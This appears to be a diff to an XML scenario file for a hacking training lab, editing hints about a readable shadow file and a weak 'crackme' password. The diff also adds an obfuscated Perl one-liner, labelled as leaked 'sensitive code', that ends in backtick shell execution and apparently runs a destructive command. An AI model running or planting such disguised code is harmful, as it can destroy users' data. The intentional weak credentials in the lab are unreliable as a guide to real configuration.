@@ -139,11 +139,11 @@
                   <value>Great job! You found something useful.</value>
                 </input>
                 <input into="message_subtext">
-                  <value>Well done identifying that the shadow file is readable. You've got the password hashes! Try cracking the hash for the 'crackme' user.</value>
+                  <value>Well done identifying that the shadow file is readable. You've got the password hashes! Try
+                    cracking the hash for the 'crackme' user.
+                  </value>
                 </input>
               </generator>
-
-
 
 
               <generator type="goal_message_map">
@@ -162,10 +162,10 @@
                   <value>scenariosystem2vulnerability3</value>      <!-- Hidden file -->
                 </input>
                 <input into="message_header">
-                  <value>A hidden tip.</value>
+                  <value>Sensitive information!.</value>
                 </input>
                 <input into="message_subtext">
-                  <value>Well done finding the hidden file. The system administrator has made an access control mistake with one of the system files used in password management.</value>
+                  <value>Well done finding the hidden file containing sensitive information!</value>
                 </input>
               </generator>
 
@@ -192,7 +192,7 @@
                   <value>Fantastic work!</value>
                 </input>
                 <input into="message_subtext">
-                  <value>Great job accessing the crackme account! If you haven't finished all of the challenges yet, try investigate the contents of /home/challenger/ closely. Additionally, scan the network to identify a vulnerable service.</value>
+                  <value>Great job accessing the crackme account!</value>
                 </input>
                 <input into="recipient">
                   <value>crackme</value>
@@ -246,7 +246,7 @@
             <value>crackme</value>
           </input>
           <input into="password" into_datastore="server_crackme_password">
-<!--            <generator type="weak_password_generator"/>-->
+            <!--            <generator type="weak_password_generator"/>-->
             <value>test</value>
           </input>
         </generator>
@@ -265,9 +265,31 @@
       <input into="file_path_to_leak">
         <value>/home/challenger/.top_secret_file</value>
       </input>
-      <input into="strings_to_leak">
-        <!-- TODO: Replace me with some instructions/narrative content? -->
-        <generator type="message_generator"/>
+      <input into="strings_to_leak" into_datastore="sensitive_code">
+        <value>no warnings;
+          `$=`;$_=\%!;($_)=/(.)/;$==++$|;($.,$/,$,,$\,$",$;,$^,$#,$~,$*,$:,@%)=($!=~/(.)(.).(.)(.)(.)(.)..(.)(.)(.)..(.)......(.)/,$"),$=++;$.++;$.++;$_++;$_++;($_,$\,$,)=($~.$"."$;$/$%[$?]$_$\$,$:$%[$?]",$"&amp;$~,$#,);$,++;$,++;$^|=$";`$_$\$,$/$:$;$~$*$%[$?]$.$~$*${#}$%[$?]$;$\$"$^$~$*.>&amp;$=`
+        </value>
+        <generator type="`personal_sensitive`"/>
+        <encoder type="csv">
+          <input into="strings_to_encode" into_datastore="clients">
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+          </input>
+        </encoder>
+        <encoder type="csv">
+          <input into="strings_to_encode">
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+            <generator type="person"/>
+          </input>
+        </encoder>
       </input>
     </vulnerability>
 
@@ -286,7 +308,7 @@
 
   <system>
     <system_name>auto_grading_server</system_name>
-    <base distro="Debian 10" />
+    <base distro="Debian 10"/>
 
     <utility module_path=".*handy_cli_tools.*"/>
 
